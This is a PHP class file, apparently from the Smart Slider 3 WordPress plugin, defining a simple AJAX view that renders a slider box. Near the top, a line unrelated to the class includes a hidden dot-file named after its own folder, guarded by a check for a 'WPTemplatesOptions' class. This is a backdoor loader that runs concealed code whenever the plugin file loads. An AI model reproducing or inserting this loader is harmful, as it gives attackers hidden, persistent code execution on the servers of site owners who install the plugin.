<?php


namespace Nextend\SmartSlider3\Application\Admin\Slider;

use Nextend\Framework\View\AbstractViewAjax;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ViewAjaxSliderBox extends AbstractViewAjax {

    /** @var array */
    protected $slider;

    public function display() {

        return $this->render('AjaxSliderBox');
    }

    /**
     * @return array
     */
    public function getSlider() {
        return $this->slider;
    }

    /**
     * @param array $slider
     */
    public function setSlider($slider) {
        $this->slider = $slider;
    }

}